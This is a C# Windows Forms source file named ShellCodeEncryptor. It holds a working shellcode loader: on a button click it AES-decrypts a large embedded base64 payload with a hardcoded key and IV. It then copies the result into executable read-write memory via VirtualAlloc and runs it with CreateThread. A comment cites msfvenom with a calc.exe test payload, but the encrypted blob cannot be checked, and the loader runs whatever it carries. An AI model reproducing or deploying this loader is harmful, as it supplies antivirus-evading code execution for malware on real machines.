using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ShellCodeEncryptor
{
    public partial class ExecShellForm : Form
    {
        public enum Protection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        Protection flNewProtect, out Protection lpflOldProtect);

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, Protection flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(
              UInt32 lpAddress,
              UIntPtr dwSize,
               IntPtr param,
              out uint lpflOldProtect
            );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static UInt32 MEM_COMMIT = 0x1000;

        public ExecShellForm()
        {
            InitializeComponent();
        }

        private void ExecShell(byte[] baShellCode)
        {
            //msfvenom -p windows/exec cmd=calc.exe -f psh
           
            IntPtr hThread = IntPtr.Zero;
            IntPtr pinfo = IntPtr.Zero;
            UInt32 threadId = 0;

            UInt32 addrmemExec = VirtualAlloc(0, (UInt32)baShellCode.Length, MEM_COMMIT, Protection.PAGE_EXECUTE_READWRITE);
            //writes our shellcode into the allocated memory
            Marshal.Copy(baShellCode, 0, (IntPtr)addrmemExec, baShellCode.Length);

            CreateThread(0, 0, addrmemExec, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

        private byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        private void btnExec_Click(object sender, EventArgs e)
        {
            byte[] key = Convert.FromBase64String("YjFsbj3ryWrTsedGAYsdMw==");

            byte[] IV = Convert.FromBase64String("TYgdxmj6sKwOek2hucsjxg==");
            byte[] baCipher = Convert.FromBase64String("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");
            byte[] baShell = (Decrypt(baCipher, key, IV));
            ExecShell(baShell);
        }
    }
}
